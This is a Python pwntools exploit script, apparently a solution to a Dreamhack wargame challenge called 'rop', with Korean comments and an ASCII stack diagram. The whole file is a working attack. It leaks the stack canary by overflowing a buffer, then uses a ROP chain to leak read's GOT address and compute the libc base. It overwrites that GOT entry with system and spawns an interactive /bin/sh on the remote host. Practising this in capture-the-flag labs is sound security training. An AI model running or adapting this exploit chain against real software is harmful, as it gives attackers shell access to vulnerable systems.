from pwn import *


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connection
# p = process('./rop')
HOST = 'host3.dreamhack.games'
PORT = 24395
p = remote(HOST, PORT)
e = ELF('./rop')
libc = ELF('./libc-2.27.so')


# Set Context
context.arch = 'amd64'
context.endian = 'little'
# context.log_level = 'debug'


# Leak Canary
buf = b'A' * (0x40 - 0x08 + 0x01)
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
slog('Canary', canary)


# Write Payload
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = 0x00000000004007f3        # ROPgadget 라이브러리를 이용해 구함
pop_rsi_r15 = 0x00000000004007f1    # pop rsi 가젯이 없기에 pop rsi; pop r15 가젯을 이용

payload = b'A' * (0x40 - 0x08) + p64(canary) + b'B' * 0x08

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

## read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
# payload += p64(0x0000000000001b96) + p64(0x10)
payload += p64(read_plt)

## read('/bin/sh') == system('/bin/sh')
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

# Exploit
p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00' * 2)
## read 함수의 got에서 read 함수의 오프셋을 이용하여 libc base 주소를 구함
libc_base = read - libc.symbols['read']
## libc base에서 system 함수의 오프셋을 더하여 실제 주소를 구함
system = libc_base + libc.symbols['system']
slog('read', read)
slog('libc_base', libc_base)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()

'''
|-----------|  Low Address
|    buf    |  0x30
|   dummy   |  0x08
|   canary  |  0x08
|    SFP    |  0x08
|    RET    |  0x08     |       pop rdi     |   <- puts(read_got)
                        |       read_got    |   
                        |       puts_plt    |
                        |       pop rdi     |   <- read(0, read_got, 0x10)
                        |          0        |
                        |     pop rsi_r15   |   
                        |       read_got    |
                        |          0        |
                        |       read_plt    |
                        |       pop_rdi     |   <- read("/bin/sh") == system("/bin/sh")
                        |   read_got + 0x8  |
                        |       read_plt    | 


|-----------|  High Address


'''
